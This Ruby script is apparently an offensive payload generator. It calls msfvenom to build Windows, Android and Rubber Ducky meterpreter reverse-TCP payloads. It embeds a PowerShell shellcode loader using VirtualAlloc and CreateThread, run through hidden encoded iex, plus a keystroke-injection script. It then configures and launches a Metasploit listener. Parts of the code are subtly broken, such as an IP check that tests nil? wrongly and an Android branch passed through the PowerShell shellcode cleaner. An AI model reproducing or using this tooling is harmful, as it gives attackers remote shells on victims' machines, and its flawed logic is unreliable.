#!/usr/bin/env ruby
# Written by L@ughingM@n

require 'base64'
require 'readline'
def print_error(text)
  print "\e[31m[-]\e[0m #{text}"
end

def print_success(text)
  print "\e[32m[+]\e[0m #{text}"
end

def print_info(text)
  print "\e[34m[*]\e[0m #{text}"
end

def get_input(text)
  print "\e[33m[!]\e[0m #{text}"
end

def rgets(prompt = '', default = '')
  choice = Readline.readline(prompt, false)
  choice == default if choice == ''
  choice
end

def select_host
  host_name = rgets('Enter the host ip to listen: ')
  
  ip = host_name.split('.')

	
if ip[0] == nil? || ip[1] == nil? || ip[2] == nil? || ip[3] == nil?
    print_error("Not a valid IP\n")
    select_host
  end
  print_success("Using #{host_name} as server\n")
  host_name
end

def select_type
puts "Payload Type"
puts "1) Windows Payload"
puts "2) Android Payload"
puts "3) Windows Rubber Ducky Payload"
type = rgets('Payload you would like to use: ')
	if type == '1'
		print_success("Using Windows Payload\n")
		return 'windows'
	elsif type == '2'
		print_success("Using Android Payload\n")
		return 'android'
	elsif type == '3'
		print_success("Using Ducky Payload\n")
		return 'ducky'
	end
end



def select_port
  port = rgets('Port you would like to use or leave blank for [5000]: ')
  if port == ''
    port = '5000'
    print_success("Using #{port}\n")
    return port
  elsif !(1..65_535).cover?(port.to_i)
    print_error("Not a valid port\n")
    sleep(1)
    select_port
  else
    print_success("Using #{port}\n")
    return port
  end
end

def payload_gen(msf_path, host, port, payload_type)

	name_of_payload = rgets('Enter Name of Payload: ')	

	print_info("Generating Payload\n")
	msf_command = "#{msf_path}./msfvenom --payload "
	puts(msf_command)
	
	if payload_type == 'windows'
		msf_command << "#{@set_payload} LHOST=#{host} LPORT=#{port} -f exe -o /root/Desktop/#{name_of_payload}.exe"
		execute  = `#{msf_command}`
		shellcode = clean_shellcode(execute)
		powershell_command = powershell_string(shellcode)
		final = to_ps_base64(powershell_command)
		final
		print_success("Windows Payload Generated\n")

	elsif payload_type == 'android'	
		msf_command << "#{@set_payload} LHOST=#{host} LPORT=#{port} R > /root/Desktop/#{name_of_payload}.apk"
		execute  = `#{msf_command}`
		shellcode = clean_shellcode(execute)
		powershell_command = powershell_string(shellcode)
		final = to_ps_base64(powershell_command)
		final
		print_success("Android Payload Generated\n")
	end
end


def shellcode_gen(msf_path, host, port)
  print_info("Generating shellcode\n")
  msf_command = "#{msf_path}./msfvenom --payload "
  msf_command << "#{@set_payload} LHOST=#{host} LPORT=#{port} -f c"
  execute  = `#{msf_command}`
  shellcode = clean_shellcode(execute)
  powershell_command = powershell_string(shellcode)
  final = to_ps_base64(powershell_command)
  final
end

def clean_shellcode(shellcode)
  shellcode = shellcode.gsub('\\', ',0')
  shellcode = shellcode.delete('+')
  shellcode = shellcode.delete('"')
  shellcode = shellcode.delete("\n")
  shellcode = shellcode.delete("\s")
  shellcode[0..18] = ''
  shellcode
end

def to_ps_base64(command)
  Base64.encode64(command.split('').join("\x00") << "\x00").gsub!("\n", '')
end

def powershell_string(shellcode)
  s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
  s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
  s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
  s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
  s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
  s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
  s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
  s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
  s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
  s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
  s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
  s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
  s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
  s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
  s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
  s << %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni )
  s << %(-enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& )
  s << %(powershell $cmd $gq";})
end

def ducky_setup(encoded_command)
  new_stream = encoded_command.scan(/.{1,30}/m)
  print_info("Writing to file\n")
  s = "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\n"
  s << "STRING powershell -nop -wind hidden -noni -enc \n"
  new_stream.each{ |x| s << "STRING #{x}\n"}
  s << 'ENTER'
  File.open('script.txt', 'w') do |f|
    f.write(s)
  end
  print_success("File Complete. Place script.txt file in sd card of rubber ducky.\n")
end

def metasploit_setup(msf_path, host, port)
  print_info("Setting up Metasploit this may take a moment\n")
  rc_file = 'msf_listener.rc'
  file = File.open("#{rc_file}", 'w')
  file.write("use exploit/multi/handler\n")
  file.write("set PAYLOAD #{@set_payload}\n")
  file.write("set LHOST #{host}\n")
  file.write("set LPORT #{port}\n")
  file.write("set EnableStageEncoding true\n")
  file.write("set ExitOnSession false\n")
  file.write('exploit -j')
  file.close
  system("#{msf_path}./msfconsole -r #{rc_file}")
end
begin
  if File.exist?('/usr/bin/msfvenom')
    msf_path = '/usr/bin/'
  elsif File.exist?('/opt/metasploit-framework/msfvenom')
    msf_path = ('/opt/metasploit-framework/')
  else
    print_error('Metasploit Not Found!')
    exit
  end
  payload_type = select_type
  #puts(payload_type)
  @set_payload = "#{payload_type}/meterpreter/reverse_tcp"
  #puts(@set_payload)
  host = select_host
  port = select_port
  	if payload_type=='windows'
		gen_payload = payload_gen(msf_path, host, port, payload_type)
	elsif payload_type=='android'
		gen_payload = payload_gen(msf_path, host, port, payload_type)
	elsif payload_type=='ducky'
	 @set_payload = "windows/meterpreter/reverse_tcp"
	 encoded_command = shellcode_gen(msf_path, host, port)
	 ducky_setup(encoded_command)
	end
  msf_setup = rgets('Would you like to start the listener?[yes/no] ')
  metasploit_setup(msf_path, host, port) if msf_setup == 'yes'
  print_info("Good Bye!\n")
end